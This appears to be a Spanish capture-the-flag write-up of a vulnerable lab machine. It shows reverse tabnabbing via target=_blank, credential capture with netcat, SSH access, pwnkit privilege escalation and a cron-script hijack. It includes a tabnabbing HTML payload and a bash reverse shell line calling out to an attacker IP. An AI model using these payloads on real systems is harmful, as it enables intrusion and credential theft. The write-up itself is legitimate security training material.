## (Intento de CSRF, vulnerabilidad target blank en el código fuente de la web, recibir password con netcat, urlencodear password recibida con burpsuite, conectarse por ssh, ejecutar linux-exploit-suggester y vulnerabilidad pwnkit)

Haremos los reconocimientos de nmap y vemos el puerto 80 y 22 abiertos:
![[Pasted image 20230423173949.png]]
Esta es la página web:
![[Pasted image 20230423174147.png]]
![[Pasted image 20230423174212.png]]
Vamos a probar en registrarnos con el usuario mario y la contraseña 123123:
![[Pasted image 20230423174408.png]]
Y tenemos esta página:
![[Pasted image 20230423174429.png]]
En este punto interceptamos la petición con burpsuite en el punto de cambiar la contraseña y convertimos la petición a GET:
![[Pasted image 20230423174731.png]]
Y si ponemos esto mismo en el navegador de esta forma también se va a cambiar la contraseña:
![[Pasted image 20230423174835.png]]
Pero vemos que no funciona, por lo que a simple vista no es vulnerable a [[MAQUINA SECNOTES (SQL Injection, CSRF (Cross-site request forgery), detectar usuarios válidos con wfuzz, netcat en windows, php malicioso y escalar privilegios en máquina Windows con subsistema de Linux instalado a través de ejecutar un bash.exe)]]. Por lo que vamos a buscar otros métodos. Por lo que vamos a probar en poner un link en el campo de input:
![[Pasted image 20230423175717.png]]
Damos a submit y ahora miramos el código fuente de la página:
![[Pasted image 20230423175743.png]]
Y en el código fuente vemos que en la parte de target pone blank, lo cual es una vulnerabilidad:
![[Pasted image 20230423175837.png]]
Y si buscamos en google nos confirman que se trata de una vulnerabilidad y aquí tenemos esta web que nos explica como explotar esta vulnerabilidad:
![[Pasted image 20230423175934.png]]
Nos dicen que primero tenemos que crear un documento html que podremos llamar por ejemplo payload.html:
```html
<html>
<script>
        if (window.opener) window.opener.parent.location.replace("http://192.168.0.19:443/index.html");
        if (window.parent != window) window.opener.parent.location.replace("http://192.168.0.19:443/index.html");
</script>
</html>
```
![[Pasted image 20230423182649.png]]
Y luego vamos a crear otro llamado index.html que tenga el código fuente de la página
![[Pasted image 20230423182718.png]]
Pegamos todo esto en el index.html:
![[Pasted image 20230423182758.png]]
Tenemos ambos archivos creados:
![[Pasted image 20230423182817.png]]
Por tanto, una vez con todo esto hecho, vamos a crear uns ervidor web con python alojando estos dos archivos:
![[Pasted image 20230423182850.png]]
Y ahora dentro de la web, simplemente tenemos que llamar a este servidor web de python al archivo payload.html de la siguiente manera, poniendo 
```html
	http://192.168.0.19:80/payload.html
```
![[Pasted image 20230423183041.png]]
Nos pondremos en el escucha también con netcat:
![[Pasted image 20230423183110.png]]
Y ahora le damos clic a submit y habremos recibido por netcat las credenciales del usuario:
![[Pasted image 20230423183235.png]]
Tenemos estas credenciales: 
```python
username=daniel

password=C%40ughtm3napping123
```
Vimos que teníamos abierto el puerto ssh, el puerto 22, por lo que vamos a probar en poner estas credenciales, pero veremos que no funcionan:
![[Pasted image 20230423183749.png]]
Por lo que es posible que esta password venga codificada de alguna manera, por lo que vamos a abrir burpsuite para corregir esto,  ya que viene url-encodeada; y vemos que ahora la password es C@ughtm3napping123:
![[Pasted image 20230423183927.png]]
Probamos esta contraseña por ssh y vemos que ya funciona:
![[Pasted image 20230423184048.png]]
Llegados a este punto, tenemos dos formas de escalar los privilegios, o bien con la herramienta linux-exploit-suggester ejecutándolo todo desde el usuario Daniel o bien modificando un archivo .py dentro del directorio del usuario adrián para mandarnos una reverse shell y escalar los privilegios con VIM:
## ESCALADA 1
Una vez dentro, podemos utilizar una herramienta que se llama linux exploit suggester [[1 - Linux Exploit Suggester]] que nos hará un análisis automatizado buscando vulnerabilidades; y encontramos una en la versión de sudo:
![[Pasted image 20230227133025.png]]
Nos lo clonamos dentro de la máquina víctima y lo ejecutamos, donde veremos que probablemente es vulnerable a la vulnerabilidad CVE-2021-3156:
![[Pasted image 20230423185958.png]]
Podemos confirmar que esto es vulnerable con el comando sudo -V, para ver la versión de sudo:
![[Pasted image 20230423190026.png]]
Tenemos este repositorio de github donde se nos muestra cómo explotar esta vulnerabilidad, donde además vemos que en el ejemplo que se nos pone en este repositorio la máquina víctima tiene la misma versión de sudo que la nuestra:
![[Pasted image 20230423190237.png]]
![[Pasted image 20230423190300.png]]
Pero cuando ejecutamos este exploit vemos que no funciona:
![[Pasted image 20230423190736.png]]
Por lo que volvemos a mirar por más vulnerabilidades de la herramienta linux-exploit-suggester:
![[Pasted image 20230423190825.png]]
Si buscamos herramientas para explotar esta vulnerabilidad, encontramos esta de github:
![[Pasted image 20230423190852.png]]
Y tenemos un proof of concept que nos explica como explotar esto mismo, donde vemos que simplemente tenemos que ejecutar el comando make y luego el exploit que se nos genera para convertirnos en root:
![[Pasted image 20230423190938.png]]
![[Pasted image 20230423191005.png]]
Esto nos habrá generado un archivo llamado cve-2021-4034, el cual simplemente tenemos que ejecutarlo y ya somos root:
![[Pasted image 20230423191045.png]]
Vemos que en el directorio de root tenemos un archivo llamado nap.py, el cual contiene unas credenciales de la base de datos mysql:
![[Pasted image 20230423191500.png]]
Por tanto nos conectamos a esta base de datos con estas credenciales y estamos dentro:
![[Pasted image 20230423191545.png]]
Y aquí encontramos las credenciales que haya dentro de la base de datos, aunque nos encontramos con nosotros mismos, que podríamos crackear nuestra password con john the ripper fácilmente ya que nuestra password era password1
![[Pasted image 20230423191711.png]]
## ESCALADA 2
Dentro del directorio personal del usuario Adrian tenemos un archivo llamado query.py:
![[Pasted image 20230423192358.png]]
Y si vemos este código de python podemos ver que lo que hace es obtener la fecha actual del sistema y la guarda en el site_status.txt:
![[Pasted image 20230424100708.png]]
![[Pasted image 20230424100727.png]]
Entonces aquí lo que podemos hacer es añadir dentro de este fichero de python el comando para ganar una reverse shell por parte del usuario Adrian, por lo que ponemos esto:

```bash
os.system("bash -c 'bash -i >& /dev/tcp/192.168.0.19/443 0>&1'")
```

![[Pasted image 20230424100811.png]]
Y entonces ahora esperamos un minuto y habremos recibido la reverse shell:
![[Pasted image 20230424100927.png]]
Y además siendo este usuario podemos ejecutar el comando sudo -l y vemos una vulnerabilidad que nos permite ejecutar comandos como root con vim:
![[Pasted image 20230424101000.png]]
Por lo que procedemos a [[14 - Escalada de Privilegios con VIM]]:

